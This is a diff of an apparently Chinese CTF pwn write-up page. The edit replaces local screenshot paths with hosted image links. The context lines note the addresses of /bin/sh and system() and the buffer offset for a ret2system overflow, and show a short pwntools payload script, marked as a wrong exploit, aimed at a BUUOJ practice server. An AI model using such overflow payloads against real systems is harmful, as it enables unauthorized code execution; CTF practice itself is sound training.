@@ -182,7 +182,7 @@ replay-btn" aria-hidden="true"></i></a>
 <p>查看字符串，双击跟进，ctrl+x交叉引用，发现程序中无调用该字符串的函数</p>
 <p>&#x2F;bin&#x2F;sh字符串地址，即shell_addr&#x3D;0x0804A024</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062100610.png"></p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 170834.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062129879.png"></p>
 <p>计算buf变量与返回地址距离，0x88+4</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062100491.png"></p>
 <p>system函数地址，0x08048320</p>
@@ -196,7 +196,7 @@ replay-btn" aria-hidden="true"></i></a>
 <p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062100344.png"></p>
 <p>ida分析，发现格式化字符串，&#x2F;bin&#x2F;sh字符串地址，0x1336及system地址,0x133D</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062101823.png"></p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 100054.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062129525.png"></p>
 <p>但本题重点不在这，而在让var[13]&#x3D;&#x3D;17即可</p>
 <p>错误的exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29772</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
